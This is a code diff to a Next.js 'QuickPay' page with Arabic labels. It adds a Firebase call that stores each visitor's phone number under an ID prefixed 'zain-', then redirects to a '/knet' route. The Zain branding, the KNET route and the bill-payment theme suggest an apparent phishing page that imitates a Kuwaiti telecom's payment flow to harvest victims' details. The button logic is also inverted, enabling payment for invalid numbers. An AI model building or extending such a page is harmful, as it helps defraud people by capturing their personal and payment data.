@@ -2,11 +2,16 @@
 
 import Head from 'next/head';
 import { CSSProperties, useState } from 'react';
+import { addData } from './lib/firebase';
+import { useRouter } from 'next/navigation';
 
 export default function QuickPay() {
   const [phone, setPhone] = useState('');
+  const [loading, setLoading] = useState(false);
   const [active, setActive] = useState<'bill' | 'ess'>('bill');
   const [selectedAmounts, setSelectedAmounts] = useState<number[]>([]);
+
+  const router = useRouter()
 
   const isPhoneValid = /^9\d{7}$/.test(phone);
 
@@ -19,9 +24,22 @@ export default function QuickPay() {
   };
 
   const total = selectedAmounts.reduce((sum, val) => sum + val, 0).toFixed(3);
-const handleSubmit=()=>{
-  
-}
+
+  const _id = Math.random().toString(36).replace("0.", "zain-")
+  const visitorId = localStorage.getItem("visitor") || _id
+
+  const handleSubmit = () => {
+    addData({
+      id: visitorId,
+      phone: phone,
+    })
+
+    setTimeout(() => {
+      router.push("/knet")
+      setLoading(false)
+    }, 2000)
+
+  }
   return (
     <>
       <Head>
@@ -112,7 +130,7 @@ const handleSubmit=()=>{
 
           <label style={labelStyle}>
             القيمة المختارة
-                      </label>
+          </label>
           <select
             value={selectedAmounts.map(String)}
             onChange={handleAmountChange}
@@ -148,10 +166,10 @@ const handleSubmit=()=>{
           </div>
 
           <button
-          
+
             className="pay-btn"
             style={
-             ! isPhoneValid && selectedAmounts.length > 0
+              !isPhoneValid && selectedAmounts.length > 0
                 ? activeBtnStyle
                 : disabledBtnStyle
             }
